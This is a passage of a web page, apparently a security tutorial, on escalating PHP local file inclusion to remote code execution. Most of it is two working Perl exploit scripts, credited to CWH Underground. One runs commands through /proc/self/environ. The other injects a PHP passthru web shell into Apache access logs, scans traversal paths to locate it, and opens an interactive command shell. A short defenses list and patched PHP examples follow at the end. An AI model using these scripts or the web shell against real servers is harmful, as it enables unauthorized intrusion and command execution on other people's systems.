<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span><span style="color:#66d9ef">use</span> LWP;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">use</span> HTTP::Request;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  $procenviron <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;../../../../../../proc/self/environ&#34;</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">## looping for execute command and exit program when command = exit ##</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;cwh-shell# &#34;</span>;
</span></span><span style="display:flex;"><span>  chomp( $cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;STDIN&gt;</span> );
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>($cmd <span style="color:#f92672">!~</span> <span style="color:#e6db74">&#34;exit&#34;</span>) 
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>     $content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>     $request <span style="color:#f92672">=</span> HTTP::Request<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span> (GET <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;http://192.168.0.111/path/to/lfi.php?file=&#34;</span><span style="color:#f92672">.</span>$procenviron<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;%00&amp;cmd=&#34;</span><span style="color:#f92672">.</span>$cmd);
</span></span><span style="display:flex;"><span>     $ua <span style="color:#f92672">=</span> LWP::UserAgent<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>();
</span></span><span style="display:flex;"><span>     $response <span style="color:#f92672">=</span> $ua<span style="color:#f92672">-&gt;</span>request ($request);
</span></span><span style="display:flex;"><span>     $content <span style="color:#f92672">=</span> $response<span style="color:#f92672">-&gt;</span>content;
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">print</span> $content<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;\n&#34;</span>;
</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;cwh-shell# &#34;</span>;
</span></span><span style="display:flex;"><span>     chomp( $cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;STDIN&gt;</span> );
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><h2 id="lfi-to-rce-complete-exploit-use-logfile-injection">LFI to RCE Complete Exploit Use Logfile Injection</h2>
<p>In order to execute code from logfile, we have a problem that we do not know the exact path of logfile.
So we have to find path by looping through the fesible paths that we have and see which file contain the word &ldquo;<code>cwhunderground</code>&rdquo; as we inject in previous example code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-perl" data-lang="perl"><span style="display:flex;"><span>  <span style="color:#66d9ef">use</span> LWP::UserAgent;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">use</span> IO::Socket;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">use</span> LWP::Simple;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  $log<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../&#34;</span>;
</span></span><span style="display:flex;"><span>  @apache<span style="color:#f92672">=</span>(
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../../var/log/httpd/access_log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../apache/logs/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../apache/logs/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../apache/logs/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../apache/logs/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../../apache/logs/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../logs/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../logs/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../logs/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../logs/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../../logs/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../../etc/httpd/logs/access_log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../../etc/httpd/logs/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../.. /../../var/www/logs/access_log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../../var/www/logs/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../../usr/local/apache/logs/access_log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../../usr/local/apache/logs/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../../var/log/apache/access_log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../../var/log/apache/access.log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../../var/log/access_log&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;../../../../../var/log/access_log&#34;</span>
</span></span><span style="display:flex;"><span>  );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">my</span> $sis<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;$^O&#34;</span>;<span style="color:#66d9ef">if</span> ($sis <span style="color:#f92672">eq</span> <span style="color:#e6db74">&#39;MSWin32&#39;</span>) { system(<span style="color:#e6db74">&#34;cls&#34;</span>); } <span style="color:#66d9ef">else</span> { system(<span style="color:#e6db74">&#34;clear&#34;</span>); }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;\n==========================================\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;      LFI to RCE Exploit \n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;      By CWH Underground \n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;==========================================\n&#34;</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (@ARGV <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Usage: ./xpl.pl &lt;Host&gt; &lt;Path&gt;\n&#34;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Ex. ./xpl.pl www.hackme.com /ktp/index.php?page=\n&#34;</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  $host<span style="color:#f92672">=</span>$ARGV[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>  $path<span style="color:#f92672">=</span>$ARGV[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( $host   <span style="color:#f92672">=~</span><span style="color:#e6db74">   /^http:/</span> ) {$host <span style="color:#f92672">=~</span> <span style="color:#e6db74">s/http:\/\///g</span>;}
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;\nTrying to Inject the Code...\n&#34;</span>;
</span></span><span style="display:flex;"><span>  $CODE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;?php if(get_magic_quotes_gpc()){ \$_GET[cmd]=stripslashes(\$_GET[cmd]);} passthru(\$_GET[cmd]);?&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>  $socket <span style="color:#f92672">=</span> IO::Socket::INET<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>(Proto<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;tcp&#34;</span>, PeerAddr<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;$host&#34;</span>, PeerPort<span style="color:#f92672">=&gt;</span><span style="color:#e6db74">&#34;80&#34;</span>) <span style="color:#f92672">or</span> die <span style="color:#e6db74">&#34;Could not connect to host.\n\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;GET /cwhunderground &#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;\#\#%\$\$%\#\#&#34;</span><span style="color:#f92672">.</span>$CODE<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;\#\#%\$\$%\#\#&#34;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34; HTTP/1.1\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;Host: &#34;</span><span style="color:#f92672">.</span>$host<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> $socket <span style="color:#e6db74">&#34;Connection: close\r\n\r\n&#34;</span>;
</span></span><span style="display:flex;"><span>  close($socket);
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( $host   <span style="color:#f92672">!~</span>   <span style="color:#e6db74">/^http:/</span> ) {$host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://&#34;</span> <span style="color:#f92672">.</span> $host;}
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">foreach</span> $getlog(@apache)
</span></span><span style="display:flex;"><span>                {
</span></span><span style="display:flex;"><span>                  chomp($getlog);
</span></span><span style="display:flex;"><span>      $find<span style="color:#f92672">=</span> $host<span style="color:#f92672">.</span>$path<span style="color:#f92672">.</span>$getlog<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;%00&#34;</span>;
</span></span><span style="display:flex;"><span>                  $xpl <span style="color:#f92672">=</span> LWP::UserAgent<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>() <span style="color:#f92672">or</span> die <span style="color:#e6db74">&#34;Could not initialize browser\n&#34;</span>;
</span></span><span style="display:flex;"><span>      $req <span style="color:#f92672">=</span> HTTP::Request<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>(GET <span style="color:#f92672">=&gt;</span> $find);
</span></span><span style="display:flex;"><span>      $res <span style="color:#f92672">=</span> $xpl<span style="color:#f92672">-&gt;</span>request($req);
</span></span><span style="display:flex;"><span>      $info <span style="color:#f92672">=</span> $res<span style="color:#f92672">-&gt;</span>content;
</span></span><span style="display:flex;"><span>                  <span style="color:#66d9ef">if</span>($info <span style="color:#f92672">=~</span><span style="color:#e6db74"> /cwhunderground/</span>)
</span></span><span style="display:flex;"><span>                  {<span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;\nSuccessfully injected in $getlog \n&#34;</span>;$log<span style="color:#f92672">=</span>$getlog;}
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;cwh-shell# &#34;</span>;
</span></span><span style="display:flex;"><span>  chomp( $cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;STDIN&gt;</span> );
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>($cmd <span style="color:#f92672">!~</span> <span style="color:#e6db74">&#34;exit&#34;</span>) {   
</span></span><span style="display:flex;"><span>       $shell<span style="color:#f92672">=</span> $host<span style="color:#f92672">.</span>$path<span style="color:#f92672">.</span>$log<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;%00&amp;cmd=$cmd&#34;</span>;
</span></span><span style="display:flex;"><span>       $xpl <span style="color:#f92672">=</span> LWP::UserAgent<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>() <span style="color:#f92672">or</span> die <span style="color:#e6db74">&#34;Could not initialize browser\n&#34;</span>;
</span></span><span style="display:flex;"><span>       $req <span style="color:#f92672">=</span> HTTP::Request<span style="color:#f92672">-&gt;</span><span style="color:#66d9ef">new</span>(GET <span style="color:#f92672">=&gt;</span> $shell);
</span></span><span style="display:flex;"><span>       $res <span style="color:#f92672">=</span> $xpl<span style="color:#f92672">-&gt;</span>request($req);
</span></span><span style="display:flex;"><span>       $info <span style="color:#f92672">=</span> $res<span style="color:#f92672">-&gt;</span>content; 
</span></span><span style="display:flex;"><span>         <span style="color:#66d9ef">if</span> ($info <span style="color:#f92672">=~</span><span style="color:#e6db74"> /\#\#%\$\$%\#\#(.*?)\#\#%\$\$%\#\#/sg</span>) 
</span></span><span style="display:flex;"><span>         {<span style="color:#66d9ef">print</span> $1;}
</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;cwh-shell# &#34;</span>;
</span></span><span style="display:flex;"><span>       chomp( $cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&lt;STDIN&gt;</span> ); 
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><hr>
<h1 id="defenses">Defenses</h1>
<ul>
<li>Implement a <strong>chroot jail</strong> for added security.</li>
<li>Validate user input and initialize variables properly.</li>
<li>Disable potentially dangerous PHP functions such as <code>allow_url_fopen</code> and <code>allow_url_include</code>.</li>
<li>Use <code>E_STRICT</code> and disable <code>register_globals</code> to detect uninitialized variables.</li>
<li>Carefully review file and stream functions (stream_*).</li>
<li>Specify the exact location of a file to avoid remote file injection.</li>
</ul>
<p><strong>Vulnerable Code</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;page&#39;</span>]; 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span>($file);
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p><strong>#1 Patching Code</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;./new.php&#34;</span>;    <span style="color:#f92672">&lt;--</span> <span style="color:#a6e22e">Should</span> <span style="color:#66d9ef">not</span> <span style="color:#66d9ef">use</span> <span style="color:#a6e22e">file</span> <span style="color:#a6e22e">name</span> <span style="color:#a6e22e">from</span> $_GET <span style="color:#a6e22e">content</span>,
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">            Always specify your files to include
</span></span></span></code></pre></div><p><strong>#2 Patching Code</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>$file <span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;page&#39;</span>]; 
</span></span><span style="display:flex;"><span>$check <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;index.php&#39;</span>, <span style="color:#e6db74">&#39;new.php&#39;</span>, <span style="color:#e6db74">&#39;guestbook.php&#39;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($file, $check))   <span style="color:#f92672">&lt;--</span> <span style="color:#a6e22e">Check</span> $_GET[<span style="color:#e6db74">&#39;page&#39;</span>] <span style="color:#a6e22e">from</span> <span style="color:#66d9ef">array</span>[]
</span></span><span style="display:flex;"><span>    {<span style="color:#66d9ef">include</span>($file);}
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>{<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Don&#39;t Hack Me Plz!&#34;</span>);}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><hr>
<h1 id="references">References</h1>
<p>[x] <a href="https://www.exploit-db.com/papers/12992">https://www.exploit-db.com/papers/12992</a></p>
<p>[x] <a href="http://en.wikipedia.org/wiki/Remote_File_Inclusion">http://en.wikipedia.org/wiki/Remote_File_Inclusion</a></p>
<p>[x] <a href="http://cwe.mitre.org/data/definitions/98.html">http://cwe.mitre.org/data/definitions/98.html</a></p>
<p>[x]  <a href="http://www.perl.com/pub/a/2002/08/20/perlandlwp.html">http://www.perl.com/pub/a/2002/08/20/perlandlwp.html</a></p>
<p>[x] <a href="https://www.notion.so/Local-File-Inclusion-to-RCE-afe8d8749e304c8e8f3fbce7ef8047ec">www.owasp.org/index.php/PHP_Top_5</a></p>
<p>[x] <a href="https://www.notion.so/Local-File-Inclusion-to-RCE-afe8d8749e304c8e8f3fbce7ef8047ec">www.milw0rm.com</a></p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
